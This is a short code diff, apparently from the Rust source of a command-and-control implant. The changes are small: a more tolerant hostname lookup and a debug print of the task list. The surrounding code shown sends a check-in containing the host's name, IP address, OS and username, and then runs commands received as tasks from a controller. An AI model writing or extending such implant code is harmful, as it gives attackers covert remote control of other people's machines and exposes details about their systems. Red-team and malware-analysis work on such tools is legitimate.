@@ -50,7 +50,7 @@ pub async fn run_implant_with_args(args: Args) -> Result<(), Box<dyn Error>> {
     // Prepare and send the check-in payload
     let checkin = ImplantCheckin {
         id: None,
-        hostname: whoami::hostname(),
+        hostname: whoami::fallible::hostname().unwrap_or_default(),
         ip_address,
         os_info: whoami::distro(),
         username: whoami::username(),
@@ -91,6 +91,8 @@ pub async fn run_implant_with_args(args: Args) -> Result<(), Box<dyn Error>> {
             eprintln!("Failed to parse tasks response");
             Vec::new()
         });
+
+        dbg!(&tasks);
 
         for task in tasks {
             println!("Executing command: {}", task.command);
